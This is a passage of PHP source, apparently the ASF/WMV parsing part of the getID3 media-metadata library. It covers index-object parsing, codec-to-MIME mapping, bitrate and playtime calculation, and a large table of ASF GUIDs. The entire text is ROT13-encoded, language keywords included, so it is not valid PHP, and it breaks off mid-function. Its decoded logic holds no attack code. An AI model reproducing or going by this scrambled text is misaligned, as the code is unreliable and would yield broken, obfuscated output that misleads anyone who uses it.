					$guvfsvyr_nfs_nfsvaqrkbowrpg['bowrpgvq_thvq']             = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_nfsvaqrkbowrpg['bowrpgfvmr']                = $ArkgBowrpgFvmr;

					$guvfsvyr_nfs_nfsvaqrkbowrpg['ragel_gvzr_vagreiny']       = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSVaqrkBowrpgQngn, $bssfrg, 4));
					$bssfrg += 4;
					$guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref_pbhag']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSVaqrkBowrpgQngn, $bssfrg, 2));
					$bssfrg += 2;
					$guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_oybpxf_pbhag']        = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSVaqrkBowrpgQngn, $bssfrg, 4));
					$bssfrg += 4;

					$NFSVaqrkBowrpgQngn .= $guvf->sernq(4 * $guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref_pbhag']);
					sbe ($VaqrkFcrpvsvrefPbhagre = 0; $VaqrkFcrpvsvrefPbhagre < $guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref_pbhag']; $VaqrkFcrpvsvrefPbhagre++) {
						$VaqrkFcrpvsvreFgernzAhzore = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSVaqrkBowrpgQngn, $bssfrg, 2));
						$bssfrg += 2;
						$guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref'][$VaqrkFcrpvsvrefPbhagre]['fgernz_ahzore']   = $VaqrkFcrpvsvreFgernzAhzore;
						$guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref'][$VaqrkFcrpvsvrefPbhagre]['vaqrk_glcr']      = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSVaqrkBowrpgQngn, $bssfrg, 2));
						$bssfrg += 2;
						$guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref'][$VaqrkFcrpvsvrefPbhagre]['vaqrk_glcr_grkg'] = $guvf->NFSVaqrkBowrpgVaqrkGlcrYbbxhc($guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref'][$VaqrkFcrpvsvrefPbhagre]['vaqrk_glcr']);
					}

					$NFSVaqrkBowrpgQngn .= $guvf->sernq(4);
					$guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_ragel_pbhag'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSVaqrkBowrpgQngn, $bssfrg, 4));
					$bssfrg += 4;

					$NFSVaqrkBowrpgQngn .= $guvf->sernq(8 * $guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref_pbhag']);
					sbe ($VaqrkFcrpvsvrefPbhagre = 0; $VaqrkFcrpvsvrefPbhagre < $guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref_pbhag']; $VaqrkFcrpvsvrefPbhagre++) {
						$guvfsvyr_nfs_nfsvaqrkbowrpg['oybpx_cbfvgvbaf'][$VaqrkFcrpvsvrefPbhagre] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSVaqrkBowrpgQngn, $bssfrg, 8));
						$bssfrg += 8;
					}

					$NFSVaqrkBowrpgQngn .= $guvf->sernq(4 * $guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref_pbhag'] * $guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_ragel_pbhag']);
					sbe ($VaqrkRagelPbhagre = 0; $VaqrkRagelPbhagre < $guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_ragel_pbhag']; $VaqrkRagelPbhagre++) {
						sbe ($VaqrkFcrpvsvrefPbhagre = 0; $VaqrkFcrpvsvrefPbhagre < $guvfsvyr_nfs_nfsvaqrkbowrpg['vaqrk_fcrpvsvref_pbhag']; $VaqrkFcrpvsvrefPbhagre++) {
							$guvfsvyr_nfs_nfsvaqrkbowrpg['bssfrgf'][$VaqrkFcrpvsvrefPbhagre][$VaqrkRagelPbhagre] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSVaqrkBowrpgQngn, $bssfrg, 4));
							$bssfrg += 4;
						}
					}
					oernx;


				qrsnhyg:
					// Vzcyrzragngvbaf funyy vtaber nal fgnaqneq be aba-fgnaqneq bowrpg gung gurl qb abg xabj ubj gb unaqyr.
					vs ($guvf->THVQanzr($ArkgBowrpgTHVQgrkg)) {
						$guvf->jneavat('haunaqyrq THVQ \"'.$guvf->THVQanzr($ArkgBowrpgTHVQgrkg).'\" {'.$ArkgBowrpgTHVQgrkg.'} va NFS obql ng bssfrg '.($bssfrg - 16 - 8));
					} ryfr {
						$guvf->jneavat('haxabja THVQ {'.$ArkgBowrpgTHVQgrkg.'} va NFS obql ng bssfrg '.($guvf->sgryy() - 16 - 8));
					}
					$guvf->sfrrx(($ArkgBowrpgFvmr - 16 - 8), FRRX_PHE);
					oernx;
			}
		}

		vs (vffrg($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf']) && vf_neenl($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'])) {
			sbernpu ($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'] nf $fgernzahzore => $fgernzqngn) {
				fjvgpu ($fgernzqngn['vasbezngvba']) {
					pnfr 'JZI1':
					pnfr 'JZI2':
					pnfr 'JZI3':
					pnfr 'ZFF1':
					pnfr 'ZFF2':
					pnfr 'JZIN':
					pnfr 'JIP1':
					pnfr 'JZIC':
					pnfr 'JIC2':
						$guvfsvyr_ivqrb['qngnsbezng'] = 'jzi';
						$vasb['zvzr_glcr'] = 'ivqrb/k-zf-jzi';
						oernx;

					pnfr 'ZC42':
					pnfr 'ZC43':
					pnfr 'ZC4F':
					pnfr 'zc4f':
						$guvfsvyr_ivqrb['qngnsbezng'] = 'nfs';
						$vasb['zvzr_glcr'] = 'ivqrb/k-zf-nfs';
						oernx;

					qrsnhyg:
						fjvgpu ($fgernzqngn['glcr_enj']) {
							pnfr 1:
								vs (fgefge($guvf->GevzPbaireg($fgernzqngn['anzr']), 'Jvaqbjf Zrqvn')) {
									$guvfsvyr_ivqrb['qngnsbezng'] = 'jzi';
									vs ($vasb['zvzr_glcr'] == 'ivqrb/k-zf-nfs') {
										$vasb['zvzr_glcr'] = 'ivqrb/k-zf-jzi';
									}
								}
								oernx;

							pnfr 2:
								vs (fgefge($guvf->GevzPbaireg($fgernzqngn['anzr']), 'Jvaqbjf Zrqvn')) {
									$guvfsvyr_nhqvb['qngnsbezng'] = 'jzn';
									vs ($vasb['zvzr_glcr'] == 'ivqrb/k-zf-nfs') {
										$vasb['zvzr_glcr'] = 'nhqvb/k-zf-jzn';
									}
								}
								oernx;

						}
						oernx;
				}
			}
		}

		fjvgpu (vffrg($guvfsvyr_nhqvb['pbqrp']) ? $guvfsvyr_nhqvb['pbqrp'] : '') {
			pnfr 'ZCRT Ynlre-3':
				$guvfsvyr_nhqvb['qngnsbezng'] = 'zc3';
				oernx;

			qrsnhyg:
				oernx;
		}

		vs (vffrg($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'])) {
			sbernpu ($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'] nf $fgernzahzore => $fgernzqngn) {
				fjvgpu ($fgernzqngn['glcr_enj']) {

					pnfr 1: // ivqrb
						$guvfsvyr_ivqrb['rapbqre'] = $guvf->GevzPbaireg($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'][$fgernzahzore]['anzr']);
						oernx;

					pnfr 2: // nhqvb
						$guvfsvyr_nhqvb['rapbqre'] = $guvf->GevzPbaireg($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'][$fgernzahzore]['anzr']);

						// NU 2003-10-01
						$guvfsvyr_nhqvb['rapbqre_bcgvbaf'] = $guvf->GevzPbaireg($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'][0]['qrfpevcgvba']);

						$guvfsvyr_nhqvb['pbqrp']   = $guvfsvyr_nhqvb['rapbqre'];
						oernx;

					qrsnhyg:
						$guvf->jneavat('Haxabja fgernzglcr: [pbqrp_yvfg_bowrpg][pbqrp_ragevrf]['.$fgernzahzore.'][glcr_enj] == '.$fgernzqngn['glcr_enj']);
						oernx;

				}
			}
		}

		vs (vffrg($vasb['nhqvb'])) {
			$guvfsvyr_nhqvb['ybffyrff']           = (vffrg($guvfsvyr_nhqvb['ybffyrff'])           ? $guvfsvyr_nhqvb['ybffyrff']           : snyfr);
			$guvfsvyr_nhqvb['qngnsbezng']         = (!rzcgl($guvfsvyr_nhqvb['qngnsbezng'])        ? $guvfsvyr_nhqvb['qngnsbezng']         : 'nfs');
		}
		vs (!rzcgl($guvfsvyr_ivqrb['qngnsbezng'])) {
			$guvfsvyr_ivqrb['ybffyrff']           = (vffrg($guvfsvyr_nhqvb['ybffyrff'])           ? $guvfsvyr_nhqvb['ybffyrff']           : snyfr);
			$guvfsvyr_ivqrb['cvkry_nfcrpg_engvb'] = (vffrg($guvfsvyr_nhqvb['cvkry_nfcrpg_engvb']) ? $guvfsvyr_nhqvb['cvkry_nfcrpg_engvb'] : (sybng) 1);
			$guvfsvyr_ivqrb['qngnsbezng']         = (!rzcgl($guvfsvyr_ivqrb['qngnsbezng'])        ? $guvfsvyr_ivqrb['qngnsbezng']         : 'nfs');
		}
		vs (!rzcgl($guvfsvyr_ivqrb['fgernzf'])) {
			$guvfsvyr_ivqrb['erfbyhgvba_k'] = 0;
			$guvfsvyr_ivqrb['erfbyhgvba_l'] = 0;
			sbernpu ($guvfsvyr_ivqrb['fgernzf'] nf $xrl => $inyhrneenl) {
				vs (($inyhrneenl['erfbyhgvba_k'] > $guvfsvyr_ivqrb['erfbyhgvba_k']) || ($inyhrneenl['erfbyhgvba_l'] > $guvfsvyr_ivqrb['erfbyhgvba_l'])) {
					$guvfsvyr_ivqrb['erfbyhgvba_k'] = $inyhrneenl['erfbyhgvba_k'];
					$guvfsvyr_ivqrb['erfbyhgvba_l'] = $inyhrneenl['erfbyhgvba_l'];
				}
			}
		}
		$vasb['ovgengr'] = 0 + (vffrg($guvfsvyr_nhqvb['ovgengr']) ? $guvfsvyr_nhqvb['ovgengr'] : 0) + (vffrg($guvfsvyr_ivqrb['ovgengr']) ? $guvfsvyr_ivqrb['ovgengr'] : 0);

		vs ((!vffrg($vasb['cynlgvzr_frpbaqf']) || ($vasb['cynlgvzr_frpbaqf'] <= 0)) && ($vasb['ovgengr'] > 0)) {
			$vasb['cynlgvzr_frpbaqf'] = ($vasb['svyrfvmr'] - $vasb['niqngnbssfrg']) / ($vasb['ovgengr'] / 8);
		}

		erghea gehr;
	}

	/**
	 * @cnenz vag $PbqrpYvfgGlcr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba pbqrpYvfgBowrpgGlcrYbbxhc($PbqrpYvfgGlcr) {
		fgngvp $ybbxhc = neenl(
			0k0001 => 'Ivqrb Pbqrp',
			0k0002 => 'Nhqvb Pbqrp',
			0kSSSS => 'Haxabja Pbqrp'
		);

		erghea (vffrg($ybbxhc[$PbqrpYvfgGlcr]) ? $ybbxhc[$PbqrpYvfgGlcr] : 'Vainyvq Pbqrp Glcr');
	}

	/**
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba XabjaTHVQf() {
		fgngvp $THVQneenl = neenl(
			'TRGVQ3_NFS_Rkgraqrq_Fgernz_Cebcregvrf_Bowrpg'   => '14R6N5PO-P672-4332-8399-N96952065O5N',
			'TRGVQ3_NFS_Cnqqvat_Bowrpg'                      => '1806Q474-PNQS-4509-N4ON-9NNOPO96NNR8',
			'TRGVQ3_NFS_Cnlybnq_Rkg_Flfg_Cvkry_Nfcrpg_Engvb' => '1O1RR554-S9RN-4OP8-821N-376O74R4P4O8',
			'TRGVQ3_NFS_Fpevcg_Pbzznaq_Bowrpg'               => '1RSO1N30-0O62-11Q0-N39O-00N0P90348S6',
			'TRGVQ3_NFS_Ab_Reebe_Pbeerpgvba'                 => '20SO5700-5O55-11PS-N8SQ-00805S5P442O',
			'TRGVQ3_NFS_Pbagrag_Oenaqvat_Bowrpg'             => '2211O3SN-OQ23-11Q2-O4O7-00N0P955SP6R',
			'TRGVQ3_NFS_Pbagrag_Rapelcgvba_Bowrpg'           => '2211O3SO-OQ23-11Q2-O4O7-00N0P955SP6R',
			'TRGVQ3_NFS_Qvtvgny_Fvtangher_Bowrpg'            => '2211O3SP-OQ23-11Q2-O4O7-00N0P955SP6R',
			'TRGVQ3_NFS_Rkgraqrq_Pbagrag_Rapelcgvba_Bowrpg'  => '298NR614-2622-4P17-O935-QNR07RR9289P',
			'TRGVQ3_NFS_Fvzcyr_Vaqrk_Bowrpg'                 => '33000890-R5O1-11PS-89S4-00N0P90349PO',
			'TRGVQ3_NFS_Qrtenqnoyr_WCRT_Zrqvn'               => '35907QR0-R415-11PS-N917-00805S5P442O',
			'TRGVQ3_NFS_Cnlybnq_Rkgrafvba_Flfgrz_Gvzrpbqr'   => '399595RP-8667-4R2Q-8SQO-98814PR76P1R',
			'TRGVQ3_NFS_Ovanel_Zrqvn'                        => '3NSO65R2-47RS-40S2-NP2P-70N90Q71Q343',
			'TRGVQ3_NFS_Gvzrpbqr_Vaqrk_Bowrpg'               => '3PO73SQ0-0P4N-4803-953Q-RQS7O6228S0P',
			'TRGVQ3_NFS_Zrgnqngn_Yvoenel_Bowrpg'             => '44231P94-9498-49Q1-N141-1Q134R457054',
			'TRGVQ3_NFS_Erfreirq_3'                          => '4O1NPOR3-100O-11Q0-N39O-00N0P90348S6',
			'TRGVQ3_NFS_Erfreirq_4'                          => '4PSRQO20-75S6-11PS-9P0S-00N0P90349PO',
			'TRGVQ3_NFS_Pbzznaq_Zrqvn'                       => '59QNPSP0-59R6-11Q0-N3NP-00N0P90348S6',
			'TRGVQ3_NFS_Urnqre_Rkgrafvba_Bowrpg'             => '5SOS03O5-N92R-11PS-8RR3-00P00P205365',
			'TRGVQ3_NFS_Zrqvn_Bowrpg_Vaqrk_Cnenzrgref_Bow'   => '6O203ONQ-3S11-4R84-NPN8-Q7613QR2PSN7',
			'TRGVQ3_NFS_Urnqre_Bowrpg'                       => '75O22630-668R-11PS-N6Q9-00NN0062PR6P',
			'TRGVQ3_NFS_Pbagrag_Qrfpevcgvba_Bowrpg'          => '75O22633-668R-11PS-N6Q9-00NN0062PR6P',
			'TRGVQ3_NFS_Reebe_Pbeerpgvba_Bowrpg'             => '75O22635-668R-11PS-N6Q9-00NN0062PR6P',
			'TRGVQ3_NFS_Qngn_Bowrpg'                         => '75O22636-668R-11PS-N6Q9-00NN0062PR6P',
			'TRGVQ3_NFS_Jro_Fgernz_Zrqvn_Fhoglcr'            => '776257Q4-P627-41PO-8S81-7NP7SS1P40PP',
			'TRGVQ3_NFS_Fgernz_Ovgengr_Cebcregvrf_Bowrpg'    => '7OS875PR-468Q-11Q1-8Q82-006097P9N2O2',
			'TRGVQ3_NFS_Ynathntr_Yvfg_Bowrpg'                => '7P4346N9-RSR0-4OSP-O229-393RQR415P85',
			'TRGVQ3_NFS_Pbqrp_Yvfg_Bowrpg'                   => '86Q15240-311Q-11Q0-N3N4-00N0P90348S6',
			'TRGVQ3_NFS_Erfreirq_2'                          => '86Q15241-311Q-11Q0-N3N4-00N0P90348S6',
			'TRGVQ3_NFS_Svyr_Cebcregvrf_Bowrpg'              => '8PNOQPN1-N947-11PS-8RR4-00P00P205365',
			'TRGVQ3_NFS_Svyr_Genafsre_Zrqvn'                 => '91OQ222P-S21P-497N-8O6Q-5NN86OSP0185',
			'TRGVQ3_NFS_Byq_EGC_Rkgrafvba_Qngn'              => '96800P63-4P94-11Q1-837O-0080P7N37S95',
			'TRGVQ3_NFS_Nqinaprq_Zhghny_Rkpyhfvba_Bowrpg'    => 'N08649PS-4775-4670-8N16-6R35357566PQ',
			'TRGVQ3_NFS_Onaqjvqgu_Funevat_Bowrpg'            => 'N69609R6-517O-11Q2-O6NS-00P04SQ908R9',
			'TRGVQ3_NFS_Erfreirq_1'                          => 'NOQ3Q211-N9ON-11ps-8RR6-00P00P205365',
			'TRGVQ3_NFS_Onaqjvqgu_Funevat_Rkpyhfvir'         => 'NS6060NN-5197-11Q2-O6NS-00P04SQ908R9',
			'TRGVQ3_NFS_Onaqjvqgu_Funevat_Cnegvny'           => 'NS6060NO-5197-11Q2-O6NS-00P04SQ908R9',
			'TRGVQ3_NFS_WSVS_Zrqvn'                          => 'O61OR100-5O4R-11PS-N8SQ-00805S5P442O',
			'TRGVQ3_NFS_Fgernz_Cebcregvrf_Bowrpg'            => 'O7QP0791-N9O7-11PS-8RR6-00P00P205365',
			'TRGVQ3_NFS_Ivqrb_Zrqvn'                         => 'OP19RSP0-5O4Q-11PS-N8SQ-00805S5P442O',
			'TRGVQ3_NFS_Nhqvb_Fcernq'                        => 'OSP3PQ50-618S-11PS-8OO2-00NN00O4R220',
			'TRGVQ3_NFS_Zrgnqngn_Bowrpg'                     => 'P5S8PORN-5ONS-4877-8467-NN8P44SN4PPN',
			'TRGVQ3_NFS_Cnlybnq_Rkg_Flfg_Fnzcyr_Qhengvba'    => 'P6OQ9450-867S-4907-83N3-P77921O733NQ',
			'TRGVQ3_NFS_Tebhc_Zhghny_Rkpyhfvba_Bowrpg'       => 'Q1465N40-5N79-4338-O71O-R36O8SQ6P249',
			'TRGVQ3_NFS_Rkgraqrq_Pbagrag_Qrfpevcgvba_Bowrpg' => 'Q2Q0N440-R307-11Q2-97S0-00N0P95RN850',
			'TRGVQ3_NFS_Fgernz_Cevbevgvmngvba_Bowrpg'        => 'Q4SRQ15O-88Q3-454S-81S0-RQ5P45999R24',
			'TRGVQ3_NFS_Cnlybnq_Rkg_Flfgrz_Pbagrag_Glcr'     => 'Q590QP20-07OP-436P-9PS7-S3OOSOS1N4QP',
			'TRGVQ3_NFS_Byq_Svyr_Cebcregvrf_Bowrpg'          => 'Q6R229Q0-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_NFS_Urnqre_Bowrpg'               => 'Q6R229Q1-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_NFS_Qngn_Bowrpg'                 => 'Q6R229Q2-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Vaqrk_Bowrpg'                        => 'Q6R229Q3-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Fgernz_Cebcregvrf_Bowrpg'        => 'Q6R229Q4-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Pbagrag_Qrfpevcgvba_Bowrpg'      => 'Q6R229Q5-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Fpevcg_Pbzznaq_Bowrpg'           => 'Q6R229Q6-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Znexre_Bowrpg'                   => 'Q6R229Q7-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Pbzcbarag_Qbjaybnq_Bowrpg'       => 'Q6R229Q8-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Fgernz_Tebhc_Bowrpg'             => 'Q6R229Q9-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Fpnynoyr_Bowrpg'                 => 'Q6R229QN-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Cevbevgvmngvba_Bowrpg'           => 'Q6R229QO-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Ovgengr_Zhghny_Rkpyhfvba_Bowrpg'     => 'Q6R229QP-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Vagre_Zrqvn_Qrcraqrapl_Bowrpg'   => 'Q6R229QQ-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Engvat_Bowrpg'                   => 'Q6R229QR-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Vaqrk_Cnenzrgref_Bowrpg'             => 'Q6R229QS-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Pbybe_Gnoyr_Bowrpg'              => 'Q6R229R0-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Ynathntr_Yvfg_Bowrpg'            => 'Q6R229R1-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Nhqvb_Zrqvn'                     => 'Q6R229R2-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Ivqrb_Zrqvn'                     => 'Q6R229R3-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Vzntr_Zrqvn'                     => 'Q6R229R4-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Gvzrpbqr_Zrqvn'                  => 'Q6R229R5-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Grkg_Zrqvn'                      => 'Q6R229R6-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_ZVQV_Zrqvn'                      => 'Q6R229R7-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Pbzznaq_Zrqvn'                   => 'Q6R229R8-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Ab_Reebe_Pbaprnyzrag'            => 'Q6R229RN-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Fpenzoyrq_Nhqvb'                 => 'Q6R229RO-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Ab_Pbybe_Gnoyr'                  => 'Q6R229RP-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_FZCGR_Gvzr'                      => 'Q6R229RQ-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_NFPVV_Grkg'                      => 'Q6R229RR-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Havpbqr_Grkg'                    => 'Q6R229RS-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_UGZY_Grkg'                       => 'Q6R229S0-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_HEY_Pbzznaq'                     => 'Q6R229S1-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Svyranzr_Pbzznaq'                => 'Q6R229S2-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_NPZ_Pbqrp'                       => 'Q6R229S3-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_IPZ_Pbqrp'                       => 'Q6R229S4-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_DhvpxGvzr_Pbqrp'                 => 'Q6R229S5-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_QverpgFubj_Genafsbez_Svygre'     => 'Q6R229S6-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_QverpgFubj_Eraqrevat_Svygre'     => 'Q6R229S7-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Ab_Raunaprzrag'                  => 'Q6R229S8-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Haxabja_Raunaprzrag_Glcr'        => 'Q6R229S9-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Grzcbeny_Raunaprzrag'            => 'Q6R229SN-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Fcngvny_Raunaprzrag'             => 'Q6R229SO-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Dhnyvgl_Raunaprzrag'             => 'Q6R229SP-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Ahzore_bs_Punaaryf_Raunaprzrag'  => 'Q6R229SQ-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Serdhrapl_Erfcbafr_Raunaprzrag'  => 'Q6R229SR-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Zrqvn_Bowrpg'                    => 'Q6R229SS-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Zhgrk_Ynathntr'                      => 'Q6R22N00-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Zhgrk_Ovgengr'                       => 'Q6R22N01-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Zhgrk_Haxabja'                       => 'Q6R22N02-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_NFS_Cynprubyqre_Bowrpg'          => 'Q6R22N0R-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Byq_Qngn_Havg_Rkgrafvba_Bowrpg'      => 'Q6R22N0S-35QN-11Q1-9034-00N0P90349OR',
			'TRGVQ3_NFS_Jro_Fgernz_Sbezng'                   => 'QN1R6O13-8359-4050-O398-388R965OS00P',
			'TRGVQ3_NFS_Cnlybnq_Rkg_Flfgrz_Svyr_Anzr'        => 'R165RP0R-19RQ-45Q7-O4N7-25POQ1R28R9O',
			'TRGVQ3_NFS_Znexre_Bowrpg'                       => 'S487PQ01-N951-11PS-8RR6-00P00P205365',
			'TRGVQ3_NFS_Gvzrpbqr_Vaqrk_Cnenzrgref_Bowrpg'    => 'S55R496Q-9797-4O5Q-8P8O-604QSR9OSO24',
			'TRGVQ3_NFS_Nhqvb_Zrqvn'                         => 'S8699R40-5O4Q-11PS-N8SQ-00805S5P442O',
			'TRGVQ3_NFS_Zrqvn_Bowrpg_Vaqrk_Bowrpg'           => 'SRO103S8-12NQ-4P64-840S-2N1Q2S7NQ48P',
			'TRGVQ3_NFS_Nyg_Rkgraqrq_Pbagrag_Rapelcgvba_Bow' => 'SS889RS1-NQRR-40QN-9R71-98704OO928PR',
			'TRGVQ3_NFS_Vaqrk_Cynprubyqre_Bowrpg'            => 'Q9NNQR20-7P17-4S9P-OP28-8555QQ98R2N2', // uggcf://zrgnpcna.bet/qvfg/Nhqvb-JZN/fbhepr/JZN.cz
			'TRGVQ3_NFS_Pbzcngvovyvgl_Bowrpg'                => '26S18O5Q-4584-47RP-9S5S-0R651S0452P9', // uggcf://zrgnpcna.bet/qvfg/Nhqvb-JZN/fbhepr/JZN.cz
			'TRGVQ3_NFS_Zrqvn_Bowrpg_Vaqrk_Cnenzrgref_Bowrpg'=> '6O203ONQ-3S11-48R4-NPN8-Q7613QR2PSN7',
		);
		erghea $THVQneenl;
	}

	/**
	 * @cnenz fgevat $THVQfgevat
	 *
	 * @erghea fgevat|snyfr
	 */
	choyvp fgngvp shapgvba THVQanzr($THVQfgevat) {
		fgngvp $THVQneenl = neenl();
		vs (rzcgl($THVQneenl)) {
			$THVQneenl = frys::XabjaTHVQf();
		}
		erghea neenl_frnepu($THVQfgevat, $THVQneenl);
	}

	/**
	 * @cnenz vag $vq
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba NFSVaqrkBowrpgVaqrkGlcrYbbxhc($vq) {
		fgngvp $NFSVaqrkBowrpgVaqrkGlcrYbbxhc = neenl();
		vs (rzcgl($NFSVaqrkBowrpgVaqrkGlcrYbbxhc)) {
			$NFSVaqrkBowrpgVaqrkGlcrYbbxhc[1] = 'Arnerfg Cnfg Qngn Cnpxrg';
			$NFSVaqrkBowrpgVaqrkGlcrYbbxhc[2] = 'Arnerfg Cnfg Zrqvn Bowrpg';
			$NFSVaqrkBowrpgVaqrkGlcrYbbxhc[3] = 'Arnerfg Cnfg Pyrnacbvag';
		}
		erghea (vffrg($NFSVaqrkBowrpgVaqrkGlcrYbbxhc[$vq]) ? $NFSVaqrkBowrpgVaqrkGlcrYbbxhc[$vq] : 'vainyvq');
	}

	/**
	 * @cnenz fgevat $THVQfgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba THVQgbOlgrfgevat($THVQfgevat) {
		// Zvpebfbsg qrsvarf gurfr 16-olgr (128-ovg) THVQf va gur fgenatrfg jnl:
		// svefg 4 olgrf ner va yvggyr-raqvna beqre
		// arkg 2 olgrf ner nccraqrq va yvggyr-raqvna beqre
		// arkg 2 olgrf ner nccraqrq va yvggyr-raqvna beqre
		// arkg 2 olgrf ner nccraqrq va ovt-raqvna beqre
		// arkg 6 olgrf ner nccraqrq va ovt-raqvna beqre

		// NnOoPpQq-RrSs-TtUu-VvWw-XxYyZzAaBbCc vf fgberq nf guvf 16-olgr fgevat:
		// $Qq $Pp $Oo $Nn $Ss $Rr $Uu $Tt $Vv $Ww $Xx $Yy $Zz $Aa $Bb $Cc

		$urkolgrpunefgevat  = pue(urkqrp(fhofge($THVQfgevat,  6, 2)));
		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat,  4, 2)));
		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat,  2, 2)));
		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat,  0, 2)));

		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 11, 2)));
		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat,  9, 2)));

		$urkolgrpunefgevat .= pue(urkqrp(fhofge($THVQfgevat, 16, 2)));
